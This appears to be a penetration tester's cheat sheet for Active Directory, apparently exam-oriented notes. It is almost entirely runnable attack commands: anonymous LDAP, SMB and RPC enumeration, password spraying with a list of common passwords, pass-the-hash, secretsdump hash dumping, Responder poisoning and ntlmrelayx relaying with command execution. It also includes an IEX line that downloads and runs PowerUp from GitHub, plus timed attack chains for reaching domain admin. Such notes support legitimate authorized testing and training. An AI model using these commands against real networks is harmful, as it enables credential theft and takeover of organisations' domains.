# Enumerate without Credentials

## Test SMB anonymous access with NetExec
```bash
# -u '' for null session OR -u 'guest' for guest account
netexec smb $IP -u '' -p '' --shares
```

## Check LDAP Guest and anonymous access (NetExec)
```bash
# -u '' for null session OR -u 'guest' for guest account
netexec ldap $IP -u '' -p '' --users --groups
netexec ldap $IP -u 'Guest' -p '' --users --groups
```

## Test WinRM/RDP anonymous access with NetExec
```bash
# Change protocol: winrm OR rdp
netexec winrm $IP -u '' -p ''
```

## Perform anonymous LDAP enumeration
```bash
# Add filter like "(objectClass=*)" for all objects
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local"
```
## Extract user accounts from LDAP
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort > users.txt
```

## Extract computer accounts from LDAP
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=computer)" dNSHostName | grep dNSHostName | cut -d: -f2 | sort > computers.txt
```

## Extract groups from LDAP
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=group)" cn | grep "cn:" | cut -d: -f2
```

## Enumerate DNS subdomains
```bash
gobuster dns -d domain.com -t 25 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Enumerate domain with enum4linux-ng
```bash
# Add -A flag for comprehensive enumeration
enum4linux-ng $IP
```

## Connect to RPC with null session
```bash
# Add -N flag to suppress password prompt
rpcclient -U "" $IP
```

## Enumerate domain users via RPC
```bash
rpcclient -U "" -N $IP -c "enumdomusers"
```

## Enumerate domain groups via RPC
```bash
rpcclient -U "" -N $IP -c "enumdomgroups"
```

## Get domain information via RPC
```bash
rpcclient -U "" -N $IP -c "querydominfo"
```

## Reverse DNS lookup for domain name
Include @$DC to specify $DC as the DNS server to make the query at.
```bash
dig -x $IP
```

## NetBIOS name discovery
```bash
# nbtscan OR nmblookup -A
nbtscan $IP
```

## Enumerate with authenticated NetExec LDAP
```bash
# Add --password-policy, --users, --groups, --computers as needed
netexec ldap $IP -u username -p password --users --groups --computers
```

## Enumerate SMB shares with credentials
```bash
# netexec (faster) OR smbclient -L for interactive
netexec smb $IP -u username -p password --shares
```

## Password spraying with NetExec
```bash
# -p 'Password123!' for single password OR -p passwords.txt for file
# Change protocol: smb, ldap, OR winrm
netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
```
## [[88 Kerberos#AS-REP Roasting|Asreproast]]
## [[88 Kerberos#Kerberoasting|Kerberoast]]

## Collect BloodHound data with Netexec
```bash
# $IP must be a domain controller
nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All
```

## SharpHound (GitHub Source)
```
https://github.com/SpecterOps/SharpHound
```

## SharpHound (Kali Source)
```
/usr/share/sharphound/SharpHound.exe
```

## Run SharpHound on Windows target
```cmd
.\SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip
```

## PowerView.ps1 (Source)
PowerShell module with commands similar to the official Active Directory module. Dot source (`. .\PowerView.ps1`) to use its functions.
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

## Get domain information (PowerView)
```powershell
Get-Domain
Get-DomainController
Get-DomainPolicy
```

## Enumerate domain users (PowerView)
```powershell
# Example: Get-DomainUser -Identity administrator | Select-Object samaccountname,description
Get-DomainUser
```

## Enumerate domain groups  (PowerView)
```powershell
# Example: Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroup
```

## Enumerate domain computers (PowerView)
```powershell
Get-DomainComputer
```

## Find domain shares (PowerView)
```powershell
Find-DomainShare -CheckShareAccess
```

## Download PowerUp for privilege escalation
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
```

## Test WinRM access with NetExec
```bash
netexec winrm -i $IP -u username -p password
```

## Pass-the-hash with NetExec
```bash
netexec smb $IP -u username -H ntlmhash
```

## Dump domain hashes with impacket-secretsdump
```bash
# Add -just-dc for DC hashes only OR -just-dc-ntlm for NTLM only
impacket-secretsdump domain.local/username:password@$IP
```

## Check for MS17-010 EternalBlue vulnerability
```bash
nmap -p 445 --script smb-vuln-ms17-010 $IP
```

## Check for SMB signing with NetExec
```bash
netexec smb $IP --gen-relay-list relay_targets.txt
```

## Enumerate with ldapdomaindump
```bash
ldapdomaindump -u 'domain.local\username' -p password $IP
```

## Get domain password policy via NetExec
```bash
# Use smb with --pass-pol OR ldap with --password-policy
netexec smb $IP -u username -p password --pass-pol
```

## Enumerate domain trusts with PowerView
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

## Find computers with unconstrained delegation
```powershell
Get-DomainComputer -Unconstrained
```

## Synchronize time with DC (Necessary for Kerberos)
```
ntpdate $IP
```

## Find users with SPN set for Kerberoasting
```powershell
Get-DomainUser -SPN
```

## Enumerate Group Policy Objects with PowerView
```powershell
Get-DomainGPO
Get-DomainGPO | Select-Object displayname,gpcfilesyspath
```

## Find local admin access with PowerView
```powershell
Find-LocalAdminAccess
Test-AdminAccess
```

## Enumerate logged on users with PowerView
```powershell
Get-NetLoggedon -ComputerName DC01
Get-NetSession -ComputerName DC01
```

## Check for LLMNR/NBT-NS poisoning opportunities
```bash
responder -I eth0 -A
```

## Run Responder for credential capture
```bash
responder -I eth0 -wrf
```

## Setup ntlmrelayx for SMB relay attacks
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

---

## Methodology

### Initial Enumeration Strategy
Start with anonymous/null session access before attempting authenticated enumeration:

**Phase 1 - Anonymous Discovery:**
1. Test null sessions on LDAP, SMB, RPC
2. Extract user lists from any accessible service
3. Compile comprehensive username list
4. Identify domain controllers and infrastructure

**Phase 2 - Credential Acquisition:**
1. ASREPRoast discovered users (no credentials needed)
2. Password spraying with common passwords
3. Responder/LLMNR poisoning (if on internal network)
4. Check for default credentials

**Phase 3 - Authenticated Enumeration:**
1. Run BloodHound collection immediately
2. Kerberoast service accounts
3. Enumerate shares and sensitive files
4. Map attack paths with BloodHound

### Service Enumeration Priority

**LDAP (389/636) - Highest Priority:**
- Often allows anonymous binding
- Returns comprehensive user/computer/group lists
- Extract all domain objects for further attacks

**SMB (139/445) - High Priority:**
- Test null sessions for share enumeration
- Look for readable shares with sensitive data
- Check SMB signing status for relay attacks

**RPC (135) - Medium Priority:**
- Sometimes allows null authentication
- Can enumerate users and groups
- Use rpcclient for manual queries

**Kerberos (88) - Authentication Required:**
- ASREPRoasting (works without credentials)
- Kerberoasting (requires valid credentials)
- Golden ticket attacks (requires krbtgt hash)

**WinRM (5985/5986) - Shell Access:**
- Test discovered credentials
- Preferred for remote shell access
- Works with pass-the-hash attacks

### Tools Selection Guide

**For Anonymous Enumeration:**
- ldapsearch (LDAP queries)
- enum4linux-ng (comprehensive SMB/RPC/LDAP)
- rpcclient (manual RPC queries)
- NetExec with null credentials

**For Authenticated Enumeration:**
- BloodHound/SharpHound (attack path analysis)
- PowerView (Windows-side enumeration)
- NetExec (multi-protocol testing)
- Impacket suite (Python-based attacks)

**For Credential Attacks:**
- impacket-GetNPUsers (ASREPRoasting)
- impacket-GetUserSPNs (Kerberoasting)
- NetExec (password spraying)
- hashcat (hash cracking)

### Common Password Spraying Wordlist
Create a file with these common AD passwords:
- Password123!
- Welcome123!
- Summer2024!
- Spring2024!
- CompanyName2024!
- Month+Year combinations

### BloodHound Analysis Focus Areas

**Shortest Paths to Look For:**
- Shortest path to Domain Admins
- Shortest path to High Value Targets
- Users with DCSync rights
- Computers with unconstrained delegation
- Kerberoastable users with admin access
- Users with GenericAll/WriteDacl on sensitive objects

### Common AD Attack Chains

**Chain 1: Anonymous LDAP -> ASREPRoast -> WinRM**
1. Anonymous LDAP enumeration for users
2. ASREPRoast to get user hashes
3. Crack hashes and login via WinRM

**Chain 2: Null SMB -> Password Spray -> Kerberoast**
1. Null SMB session for user enumeration
2. Password spray with common passwords
3. Kerberoast service accounts
4. Crack service account hashes for privilege escalation

**Chain 3: Responder -> Relay -> Local Admin**
1. Capture credentials with Responder
2. Relay to targets without SMB signing
3. Gain local admin access
4. Extract credentials for lateral movement

### Time Management

**First 15 Minutes:**
- Test anonymous LDAP/SMB/RPC access
- Extract all available user lists
- Start ASREPRoast attack

**Next 15 Minutes:**
- Password spraying with top 5 passwords
- Run BloodHound if credentials obtained
- Start Kerberoast if authenticated

**Ongoing:**
- Hash cracking in background
- BloodHound path analysis
- Lateral movement testing

### Resources
- BloodHound CE: https://github.com/SpecterOps/BloodHound
- BloodHound Usage: https://bloodhound.readthedocs.io/
- PowerView Documentation: https://powersploit.readthedocs.io/
- Impacket Examples: https://github.com/SecureAuthCorp/impacket/tree/master/examples
- NetExec Wiki: https://www.netexec.wiki/
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- BloodHound Attack Paths: https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
- OSCP Secret Sauce: https://eins.li/posts/oscp-secret-sauce/
